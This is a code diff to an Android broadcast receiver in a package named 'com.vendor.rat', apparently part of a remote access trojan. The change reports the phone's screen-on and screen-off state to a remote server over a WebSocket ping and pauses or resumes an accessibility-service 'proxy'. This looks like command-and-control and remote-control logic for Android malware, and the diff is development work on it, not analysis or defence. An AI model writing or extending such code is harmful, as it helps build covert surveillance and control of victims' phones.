@@ -7,6 +7,7 @@ import android.content.IntentFilter;
 import android.util.Log;
 
 import com.vendor.rat.network.NetworkManager;
+import com.vendor.rat.network.WebSocketClient;
 import com.vendor.rat.service.MyAccessibilityService;
 
 /**
@@ -32,24 +33,28 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
     }
 
     private void onScreenOff(Context context) {
-        // 上报息屏状态
-        if (NetworkManager.getInstance().getWebSocketClient() != null) {
-            NetworkManager.getInstance().getWebSocketClient().sendStatus("screen_off");
+        // 上报息屏状态 (通过 Laravel 协议: subc=ping, msg=screen_state=0)
+        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
+        if (ws != null) {
+            ws.sendPing("screen_state=0");
         }
 
         // 暂停无障碍代理
-        if (MyAccessibilityService.getInstance() != null) {
-            MyAccessibilityService.getInstance().pauseProxy();
+        MyAccessibilityService service = MyAccessibilityService.getInstance();
+        if (service != null) {
+            service.pauseProxy();
         }
     }
 
     private void onScreenOn(Context context) {
-        if (NetworkManager.getInstance().getWebSocketClient() != null) {
-            NetworkManager.getInstance().getWebSocketClient().sendStatus("screen_on");
+        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
+        if (ws != null) {
+            ws.sendPing("screen_state=1");
         }
 
-        if (MyAccessibilityService.getInstance() != null) {
-            MyAccessibilityService.getInstance().resumeProxy();
+        MyAccessibilityService service = MyAccessibilityService.getInstance();
+        if (service != null) {
+            service.resumeProxy();
         }
     }
 
